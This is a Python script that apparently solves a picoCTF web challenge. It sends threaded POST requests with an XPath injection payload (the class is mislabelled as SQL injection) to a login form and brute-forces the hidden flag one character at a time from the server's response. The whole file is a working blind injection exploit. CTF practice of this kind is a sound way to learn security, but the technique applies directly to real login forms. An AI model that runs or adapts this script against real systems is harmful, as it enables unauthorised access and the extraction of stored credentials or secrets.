import requests
import threading

URL = "http://mercury.picoctf.net:53735/"

def thread(func):
    '''thread decorator'''
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.start()
        return thread
    return wrapper

class Blind_SQLI:
    def __init__(self, url=URL):
        self.url = url
        self.seenChar = "picoCTF{"
        self.charList = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
    
    @thread
    def send_requests_sqli(self, char):
        '''Send all `requests.get()`+SQLI payload to the target server.'''
        data={"name": "admin", "pass": f"' or //*[starts-with(text(),'{self.seenChar+char}')] or '1'='"}
        req = requests.post(self.url, data=data)
        if "You&#39;re on the right path." in req.text:
            self.seenChar += char
            return True
        print(f"Not found char: {self.seenChar+char}", end="\r")
        
    def start(self):
        '''Start the SQLI attack.'''
        while True:
            for i in self.charList:
                self.send_requests_sqli(i)
            # join all threads
            for thread in threading.enumerate():
                if thread is not threading.current_thread():
                    thread.join()
            print(f"Found char: {self.seenChar}")
            
Blind_SQLI().start()